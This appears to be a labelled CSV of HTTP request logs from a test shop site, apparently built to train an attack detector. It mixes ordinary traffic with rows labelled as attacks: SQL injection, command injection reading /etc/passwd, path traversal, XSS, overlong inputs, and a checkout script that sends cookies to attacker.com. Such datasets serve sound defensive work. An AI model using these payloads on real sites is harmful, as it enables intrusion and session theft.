timestamp,ip,method,path,payload,label
07:30:57.1,192.168.1.55,POST,/auth/register,"{'csrf_token': 'Imh6i7rm6yJxGBYpjaFu5JqEcpKoRdyxnL2y8HP5KI'.2VTjrRoJ.h2jYY33YTBLpb8GYAgSa5SDGDt5Z, 'username': 'newuser29', 'email': 'a47@b.com', 'password': 'dZchShEpHY&H', 'submit': 'Register'}",0
07:30:59.2,192.168.1.185,POST,/search,{'query': 'iphone 15 pro max'},0
07:31:00.8,192.168.1.50,GET,/product/2,,0
07:31:03.5,192.168.1.162,GET,/category/Iphone,,0
07:31:05.6,192.168.1.197,GET,/auth/logout,,0
07:31:07.2,103.75.118.228,GET,/search?q=' OR 1=1; --,,1
07:31:08.9,10.0.0.79,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
07:31:11.0,103.75.118.228,GET,/product/1' AND 1=1,,1
07:31:13.5,103.75.118.228,POST,/search,{'query': 'product; cat /etc/passwd'},1
07:31:15.0,10.0.0.15,POST,/auth/login,"{'csrf_token': 'Imo44qSBoBCBko3m3lS9B3igO6pmkcmKiGVJapUPdk'.IOROpSMV.V9kBK6aheU6zp738VPa3Dfe4AIXZ, 'username': 'user54', 'password': 'hrRSmunIYK)7', 'submit': 'Log in'}",0
07:31:17.6,192.168.1.12,POST,/search,{'query': 'iphone 15 pro max'},0
07:31:19.7,203.162.4.190,GET,/search?q=' OR 1=1; --,,1
07:31:21.7,10.0.0.67,POST,/auth/login,"{'csrf_token': 'ImUnAPCXtvG0nNGlqHqGacbUiTZDN5jUnfwVXwq1fU'.HIfLwFnQ.tT8PYqzRapO2m-y0PcT0oMpHTMaW, 'username': 'user65', 'password': 'jzp@R*nYVi&*', 'submit': 'Log in'}",0
07:31:23.3,103.75.118.228,POST,/search,{'query': 'product; cat /etc/passwd'},1
07:31:25.0,203.162.4.191,POST,/search,{'query': 'product; cat /etc/passwd'},1
07:31:27.3,192.168.1.197,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
07:31:29.5,103.75.118.228,GET,/search?q=<script>alert('XSS')</script>,,1
07:31:31.5,192.168.1.12,GET,/,,0
07:31:33.3,203.162.4.190,GET,/search?q=<script>alert('XSS')</script>,,1
07:31:35.6,192.168.1.46,GET,/product/2,,0
07:31:37.0,192.168.1.185,GET,/product/1,,0
07:31:38.9,127.0.0.1,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
07:31:40.8,203.162.4.190,GET,/../../../../etc/passwd,,1
07:31:43.2,10.0.0.66,POST,/search,{'query': 'iphone 15 pro max'},0
07:31:45.6,192.168.1.169,POST,/search,{'query': 'iphone 15 pro max'},0
07:31:47.4,192.168.1.55,GET,/order/myorders,,0
07:31:49.6,192.168.1.28,GET,/category/Iphone,,0
07:31:51.7,203.162.4.191,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
07:31:53.2,192.168.1.22,GET,/product/1,,0
07:31:55.5,203.162.4.190,GET,/search?q=' OR 1=1; --,,1
07:31:56.9,10.0.0.67,GET,/product/1,,0
07:31:59.2,203.162.4.190,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
07:32:00.9,10.0.0.15,GET,/product/2,,0
07:32:03.0,203.162.4.190,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
07:32:05.3,203.162.4.191,GET,/search?q=' OR 1=1; --,,1
07:32:07.3,10.0.0.15,POST,/auth/login,"{'csrf_token': 'ImVl76QhkuMjQAQCTtx6GDlQK6F7PPwIUO2Egso3Rd'.gcqkGKKG.2yoVmHtJE5CIE_GB6Ei5wxMxsXxf, 'username': 'user39', 'password': '9AXTYfPPRFBy', 'submit': 'Log in'}",0
07:32:09.1,203.162.4.190,GET,/search?q=<script>alert('XSS')</script>,,1
07:32:11.0,203.162.4.191,GET,/../../../../etc/passwd,,1
07:32:13.3,192.168.1.182,GET,/auth/logout,,0
07:32:15.1,127.0.0.1,GET,/order/myorders,,0
07:32:17.6,192.168.1.50,GET,/auth/logout,,0
07:32:19.2,10.0.0.79,GET,/auth/login,,0
07:32:21.4,10.0.0.82,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
07:32:23.5,192.168.1.28,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
07:32:25.7,192.168.1.175,POST,/auth/login,"{'csrf_token': 'ImS8vxW8VtGv4nlV6MzX9EqtqhdgyojIGSCeKcUnPU'.7i0mMcSl.5jEJoJQu0vQZJj_u7Om1q2xZ0_Gm, 'username': 'user96', 'password': 'A8DJgMsQwmJ4', 'submit': 'Log in'}",0
07:32:27.7,127.0.0.1,GET,/order/cart,,0
07:32:29.0,192.168.1.197,POST,/auth/login,"{'csrf_token': 'ImAMRz4VKW5WzGV1WvqTx7Pl7bnnMr1EDQjF4enKx4'.SkNr5hdT.YjKXtJsSDpsYKpIfDWnb-lFonsk_, 'username': 'user54', 'password': '29l9GId*^^1C', 'submit': 'Log in'}",0
07:32:31.3,203.162.4.190,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
07:32:33.0,192.168.1.50,POST,/auth/register,"{'csrf_token': 'ImOWKpf5YmN6vFhDefh9AX18LUJ0ET2m6yMyGftH9I'.09jdWUj6.s-1yP7eDcGQ4imBDAGyHEWqPeM50, 'username': 'newuser86', 'email': 'a62@b.com', 'password': '17LI@u)wAC!L', 'submit': 'Register'}",0
07:32:35.1,192.168.1.197,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
07:32:37.4,127.0.0.1,GET,/auth/logout,,0
07:32:39.0,192.168.1.50,GET,/auth/logout,,0
07:32:41.0,10.0.0.195,GET,/auth/login,,0
07:32:43.4,192.168.1.18,GET,/product/2,,0
07:32:45.5,192.168.1.165,GET,/category/Iphone,,0
07:32:47.0,203.162.4.190,GET,/../../../../etc/passwd,,1
07:32:49.4,203.162.4.191,GET,/../../../../etc/passwd,,1
07:32:51.0,203.162.4.191,GET,/product/1' AND 1=1,,1
07:32:53.6,192.168.1.56,POST,/auth/login,"{'csrf_token': 'ImNApMUVrBkSjHhkb49aq12Fd7MXadfPL98TtSpfz3'.MdatAFBZ.R9yAeUdhqjgqpqxHSL3Rgcwdob0H, 'username': 'user36', 'password': 'Z##CJ6gg#BnH', 'submit': 'Log in'}",0
07:32:55.3,203.162.4.191,POST,/auth/register,"{'csrf_token': 'ImUHCaHZnsjarvYLpjU8fCvyr0fYAjpES5naOZ4zcd'.W4XP4Cbv.6IGUE47hDQIFPpDKUC713Lv0BNED, 'username': 'newuser71', 'email': 'a8@b.com', 'password': 'CWxQYKeQMU#M', 'submit': 'Register'}",0
07:32:57.3,103.75.118.228,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
07:32:59.0,203.162.4.191,POST,/search,{'query': 'product; cat /etc/passwd'},1
07:33:01.6,203.162.4.191,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
07:33:03.2,192.168.1.12,GET,/product/1,,0
07:33:05.5,203.162.4.190,POST,/search,{'query': 'product; cat /etc/passwd'},1
07:33:07.0,203.162.4.190,GET,/../../../../etc/passwd,,1
07:33:09.5,103.75.118.228,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
07:33:11.4,192.168.1.169,GET,/product/1,,0
07:33:13.5,192.168.1.55,GET,/auth/login,,0
07:33:14.8,103.75.118.228,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
07:33:16.8,192.168.1.50,GET,/order/myorders,,0
07:33:18.8,10.0.0.15,POST,/auth/login,"{'csrf_token': 'ImZMwU94d4DVH28eAhiY4GqUFcfE96jYovS74i1R4p'.V9xW08zC.0RNspglM5OSvH_FoUTYgpWLfqjPY, 'username': 'user8', 'password': 'uiZ7@iW3jcvk', 'submit': 'Log in'}",0
07:33:21.5,203.162.4.191,POST,/search,{'query': 'product; cat /etc/passwd'},1
07:33:22.8,192.168.1.28,POST,/search,{'query': 'iphone 15 pro max'},0
07:33:25.5,192.168.1.175,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
07:33:27.0,203.162.4.190,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
07:33:29.6,10.0.0.195,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
07:33:31.0,203.162.4.191,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
07:33:32.8,192.168.1.185,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
07:33:35.4,10.0.0.79,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
07:33:37.0,103.75.118.228,GET,/search?q=' OR 1=1; --,,1
07:33:39.2,203.162.4.191,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
07:33:40.9,192.168.1.56,POST,/auth/login,"{'csrf_token': 'Im2O8LXhjiUD1XvP1rAuTc5sy8Qkyzz9ztanFvUnfa'.hEEvPyUX.8f8-GfIDGRRbHjnfYvJWGoTdmp6R, 'username': 'user36', 'password': 'Fuz9yOqyKP0o', 'submit': 'Log in'}",0
07:33:43.7,192.168.1.165,POST,/search,{'query': 'iphone 15 pro max'},0
07:33:45.2,192.168.1.28,GET,/product/2,,0
07:33:46.9,103.75.118.228,POST,/search,{'query': 'product; cat /etc/passwd'},1
07:33:49.4,192.168.1.162,GET,/product/2,,0
07:33:51.7,192.168.1.18,GET,/,,0
07:33:53.6,203.162.4.191,POST,/search,{'query': 'product; cat /etc/passwd'},1
07:33:55.1,203.162.4.190,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
07:33:56.8,10.0.0.82,POST,/auth/register,"{'csrf_token': 'ImMavxVJOXOYryqQRwUQbXIsDU7W1fkipcPGFq7r43'.ZsCfe8nh.SvArzCSRcUJ2zZcj_bHXgqBghlz-, 'username': 'newuser30', 'email': 'a28@b.com', 'password': 'bKuBLPl(cirH', 'submit': 'Register'}",0
07:33:58.9,192.168.1.151,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
07:34:00.8,10.0.0.15,POST,/search,{'query': 'iphone 15 pro max'},0
07:34:03.5,10.0.0.79,GET,/product/1,,0
07:34:05.1,103.75.118.228,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
07:34:07.6,203.162.4.190,GET,/../../../../etc/passwd,,1
07:34:08.8,10.0.0.176,GET,/product/1,,0
07:34:11.2,103.75.118.228,GET,/search?q=<script>alert('XSS')</script>,,1
07:34:12.8,192.168.1.167,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
07:34:15.5,192.168.1.162,POST,/search,{'query': 'iphone 15 pro max'},0
07:34:16.9,192.168.1.165,GET,/order/myorders,,0
07:34:18.8,103.75.118.228,GET,/search?q=<script>alert('XSS')</script>,,1
07:34:21.4,10.0.0.66,POST,/auth/register,"{'csrf_token': 'ImkT7PcAdlxJtzzKL3u707Kg9xFsOvPU12myKfE7IG'.nx9MpK9W.SglcskfO5BBwqLcYiq85TU0awwSV, 'username': 'newuser26', 'email': 'a62@b.com', 'password': 'YNG0fXciPXfG', 'submit': 'Register'}",0
07:34:23.2,192.168.1.50,GET,/product/2,,0
07:34:24.8,103.75.118.228,GET,/product/1' AND 1=1,,1
07:34:27.5,103.75.118.228,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
07:34:28.8,203.162.4.190,GET,/search?q=' OR 1=1; --,,1
07:34:31.2,192.168.1.169,GET,/product/1,,0
07:34:33.3,192.168.1.185,POST,/search,{'query': 'iphone 15 pro max'},0
07:34:35.3,127.0.0.1,GET,/product/2,,0
07:34:37.5,10.0.0.82,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
07:34:39.0,10.0.0.195,GET,/auth/login,,0
07:34:41.5,10.0.0.106,POST,/auth/login,"{'csrf_token': 'Imt1EWgwGhIDySQis6nYfWsF8GoAAlvI0w6Rnl5uUS'.tRJFbfZb.eZ2f3iz0kXQrnhdLc3Xss_zSPPtX, 'username': 'user51', 'password': 'UN)k0f*&FbEh', 'submit': 'Log in'}",0
07:34:43.4,203.162.4.191,GET,/product/1' AND 1=1,,1
07:34:45.3,127.0.0.1,POST,/search,{'query': 'iphone 15 pro max'},0
07:34:46.9,203.162.4.190,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
07:34:49.5,10.0.0.195,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
07:34:51.2,10.0.0.146,GET,/auth/register,,0
07:34:53.7,103.75.118.228,GET,/search?q=' OR 1=1; --,,1
07:34:54.9,10.0.0.28,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
07:34:57.6,10.0.0.106,POST,/search,{'query': 'iphone 15 pro max'},0
07:34:59.3,203.162.4.190,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
07:35:01.0,203.162.4.191,GET,/category/Iphone,,0
07:35:03.7,203.162.4.191,GET,/search?q=' OR 1=1; --,,1
07:35:05.1,203.162.4.191,POST,/search,{'query': 'product; cat /etc/passwd'},1
07:35:07.4,10.0.0.176,POST,/search,{'query': 'iphone 15 pro max'},0
07:35:09.0,10.0.0.176,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
07:35:11.1,192.168.1.165,POST,/auth/login,"{'csrf_token': 'ImICrVQ6yd70TGNxZMDoBXZ2myYB3x4wLeu8zW2ifb'.66Dfs8NQ.9uxbxrLD8QWGGW2Mo8as6RUefW1n, 'username': 'user75', 'password': 'Owe*1YSHl!%0', 'submit': 'Log in'}",0
07:35:12.9,103.75.118.228,GET,/product/1' AND 1=1,,1
07:35:15.3,10.0.0.82,GET,/order/cart,,0
07:35:17.1,10.0.0.15,GET,/order/myorders,,0
07:35:19.1,203.162.4.191,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
07:35:21.2,203.162.4.190,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
07:35:23.4,192.168.1.56,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
07:35:25.3,203.162.4.191,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
07:35:27.1,192.168.1.56,GET,/order/myorders,,0
07:35:28.8,192.168.1.56,POST,/auth/login,"{'csrf_token': 'ImLHjpdwTIw64yz3X0CF0k6VJ3TVfqgW8gtrs88AW4'.D4bq5kZu.xaqQ8dZlYsigfUqPaho1iqHUPL36, 'username': 'user13', 'password': 'e$SpfmMdF8Wq', 'submit': 'Log in'}",0
07:35:31.6,103.75.118.228,GET,/product/1' AND 1=1,,1
07:35:33.0,103.75.118.228,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
07:35:35.5,10.0.0.106,POST,/auth/login,"{'csrf_token': 'Ima9T67dxRaCk8OAVqSfG8okuljLL00PbSzL1VNTKT'.cS3fTtNR.MUPXMDVOyiPosGqEM6WxFFRJSQLU, 'username': 'user60', 'password': '8AIS6Me$@(A#', 'submit': 'Log in'}",0
07:35:37.5,203.162.4.191,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
07:35:39.6,192.168.1.28,GET,/auth/register,,0
07:35:41.7,10.0.0.28,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
07:35:43.4,10.0.0.28,GET,/product/1,,0
07:35:45.0,103.75.118.228,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
07:35:47.1,192.168.1.50,POST,/auth/login,"{'csrf_token': 'ImaCHaWpLZn9Lx9pqrQgl31Zwilh5rHnqa24oAD9Je'.PWjuA6zK.e_6ci5BZh1vqw1cvwrmHR826hjqc, 'username': 'user84', 'password': 'lxH)^j#9If0S', 'submit': 'Log in'}",0
07:35:49.3,103.75.118.228,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
07:35:51.3,103.75.118.228,GET,/search?q=' OR 1=1; --,,1
07:35:53.3,192.168.1.18,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
07:35:55.3,192.168.1.151,GET,/auth/login,,0
07:35:57.5,203.162.4.190,GET,/search?q=' OR 1=1; --,,1
07:35:58.9,103.75.118.228,GET,/product/1' AND 1=1,,1
07:36:01.0,203.162.4.191,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
07:36:03.2,10.0.0.176,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
07:36:05.7,10.0.0.146,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
07:36:07.0,203.162.4.190,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
07:36:08.8,203.162.4.190,GET,/product/1' AND 1=1,,1
07:36:11.6,203.162.4.191,GET,/search?q=<script>alert('XSS')</script>,,1
07:36:13.3,192.168.1.55,POST,/auth/login,"{'csrf_token': 'Im9oHXdmGfv57AFGFkRxXuvqs3ZsoA3p9BamoEYU24'.hUbL6wtB.seXhX_kRuV5djNggZcf14BE1KUSM, 'username': 'user22', 'password': 'Cu8c61HHK3Ez', 'submit': 'Log in'}",0
07:36:15.7,203.162.4.190,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
07:36:17.7,192.168.1.46,GET,/order/myorders,,0
07:36:19.7,192.168.1.18,POST,/auth/login,"{'csrf_token': 'ImM6el1H5k174oDqyA6hBLfYxrFtzsd0X2b1meNfNE'.vREJva69.GVZRPyZaG0xPOqR68NvjNI8Yv5LT, 'username': 'user91', 'password': 'C8WAFjagTRvv', 'submit': 'Log in'}",0
07:36:21.0,127.0.0.1,GET,/auth/register,,0
07:36:23.1,103.75.118.228,GET,/product/1' AND 1=1,,1
07:36:25.1,10.0.0.176,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
07:36:27.7,10.0.0.146,GET,/order/myorders,,0
07:36:29.7,203.162.4.190,POST,/search,{'query': 'product; cat /etc/passwd'},1
07:36:31.7,203.162.4.190,GET,/search?q=' OR 1=1; --,,1
07:36:33.0,10.0.0.176,GET,/auth/logout,,0
07:36:35.0,192.168.1.182,GET,/auth/register,,0
07:36:36.9,192.168.1.50,GET,/auth/register,,0
07:36:39.2,10.0.0.79,POST,/search,{'query': 'iphone 15 pro max'},0
07:36:40.9,203.162.4.191,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
07:36:43.0,203.162.4.190,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
07:36:45.1,10.0.0.82,GET,/order/cart,,0
07:36:47.3,203.162.4.191,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
07:36:48.8,192.168.1.12,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
07:36:51.5,10.0.0.176,GET,/order/myorders,,0
07:36:53.2,203.162.4.190,GET,/search?q=<script>alert('XSS')</script>,,1
07:36:54.9,192.168.1.197,POST,/search,{'query': 'iphone 15 pro max'},0
07:36:57.1,192.168.1.197,POST,/search,{'query': 'iphone 15 pro max'},0
07:36:59.1,192.168.1.182,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
07:37:01.3,203.162.4.190,GET,/product/1' AND 1=1,,1
07:37:03.6,203.162.4.191,GET,/,,0
07:37:05.1,10.0.0.195,GET,/product/2,,0
07:37:07.6,192.168.1.28,POST,/auth/register,"{'csrf_token': 'ImiBeLBD58FXexncwginnvVPf2VAPG0zha3VfT7O47'.PeN9bEc2.id2f7BnKFwd4GBOlB_kCy03HV5uN, 'username': 'newuser47', 'email': 'a56@b.com', 'password': 'yy@iimS)59s@', 'submit': 'Register'}",0
07:37:09.0,203.162.4.190,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
07:37:11.7,192.168.1.56,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
07:37:13.4,10.0.0.67,POST,/search,{'query': 'iphone 15 pro max'},0
07:37:14.9,103.75.118.228,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
